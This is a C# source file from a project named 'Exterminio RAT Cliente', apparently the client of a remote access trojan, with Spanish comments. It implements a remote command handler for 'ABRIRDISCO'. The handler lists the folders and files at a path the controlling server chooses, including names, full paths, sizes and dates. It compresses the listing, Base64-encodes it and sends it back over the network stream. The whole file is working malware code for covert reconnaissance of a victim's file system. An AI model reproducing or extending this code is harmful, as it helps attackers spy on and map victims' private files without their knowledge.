using System;
using System.IO;
using System.Text;
using System.IO.Compression;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;

namespace Exterminio_RAT_Cliente
{
    public class AbrirDiscoHandler
    {
        private static readonly Mutex socketMutex = new Mutex(false, "AbrirDiscoSocketMutex");

        public static Task HandleAbrirDiscoCommand(NetworkStream stream, string ruta)
        {
            return Task.Run(() =>
            {
                try
                {
                    Console.WriteLine($"Comando ABRIRDISCO recibido para ruta: {ruta}");
                    
                    // Obtener información de archivos y carpetas
                    string archivosInfo = ObtenerInformacionArchivosFormateada(ruta);
                    
                    // Convertir a bytes
                    byte[] archivosInfoBytes = Encoding.UTF8.GetBytes(archivosInfo);
                    
                    // Comprimir con Deflate
                    byte[] compressedData = ComprimirDatos(archivosInfoBytes);
                    
                    // Codificar en Base64
                    string archivosMessage = "ABRIRDISCO:" + Convert.ToBase64String(compressedData);
                    
                    // Enviar al servidor
                    byte[] archivosBytes = Encoding.UTF8.GetBytes(archivosMessage);
                    
                    // Usar mutex para proteger la escritura del socket
                    if (socketMutex.WaitOne(5000))
                    {
                        try
                        {
                            stream.Write(archivosBytes, 0, archivosBytes.Length);
                            Console.WriteLine($"Información de archivos enviada exitosamente al servidor: {archivosBytes.Length} bytes");
                        }
                        finally
                        {
                            socketMutex.ReleaseMutex();
                        }
                    }
                    else
                    {
                        Console.WriteLine("Error: No se pudo adquirir el mutex para enviar datos de archivos");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error procesando comando ABRIRDISCO: {ex.Message}");
                }
            });
        }

        private static string ObtenerInformacionArchivosFormateada(string ruta)
        {
            try
            {
                StringBuilder resultado = new StringBuilder();
                resultado.Append("[ARCHIVOS] | ");
                
                // Verificar si la ruta existe
                if (!Directory.Exists(ruta))
                {
                    resultado.Append("[ERROR(Ruta no encontrada)]");
                    return resultado.ToString();
                }

                // Obtener carpetas
                try
                {
                    string[] carpetas = Directory.GetDirectories(ruta);
                    foreach (string carpeta in carpetas)
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(carpeta);
                        string nombre = dirInfo.Name;
                        string rutaCompleta = dirInfo.FullName;
                        string fechaCreacion = dirInfo.CreationTime.ToString("yyyy-MM-dd HH:mm:ss");
                        
                        resultado.Append($"[CARPETA({nombre})({rutaCompleta})({fechaCreacion})] - ");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error obteniendo carpetas: {ex.Message}");
                }

                // Obtener archivos
                try
                {
                    string[] archivos = Directory.GetFiles(ruta);
                    foreach (string archivo in archivos)
                    {
                        FileInfo fileInfo = new FileInfo(archivo);
                        string nombre = fileInfo.Name;
                        string extension = fileInfo.Extension;
                        string rutaCompleta = fileInfo.FullName;
                        string tamaño = FormatearBytes(fileInfo.Length);
                        string fechaModificacion = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
                        
                        resultado.Append($"[ARCHIVO({nombre})({extension})({rutaCompleta})({tamaño})({fechaModificacion})] - ");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error obteniendo archivos: {ex.Message}");
                }

                // Remover el último " - " si existe
                string resultadoFinal = resultado.ToString();
                if (resultadoFinal.EndsWith(" - "))
                {
                    resultadoFinal = resultadoFinal.Substring(0, resultadoFinal.Length - 3);
                }

                resultadoFinal += "]";
                
                Console.WriteLine($"Información de archivos obtenida: {resultadoFinal}");
                return resultadoFinal;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error obteniendo información de archivos: {ex.Message}");
                return "[ARCHIVOS] | [ERROR(Error obteniendo archivos)]";
            }
        }

        private static string FormatearBytes(long bytes)
        {
            if (bytes == 0) return "0B";
            string[] sufijos = { "B", "KB", "MB", "GB", "TB" };
            int contador = 0;
            double numero = bytes;
            while (numero >= 1024 && contador < sufijos.Length - 1)
            {
                numero /= 1024;
                contador++;
            }
            return $"{numero:0.##}{sufijos[contador]}";
        }

        private static byte[] ComprimirDatos(byte[] datos)
        {
            using (MemoryStream compressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Compress))
                {
                    deflateStream.Write(datos, 0, datos.Length);
                }
                return compressedStream.ToArray();
            }
        }
    }
}
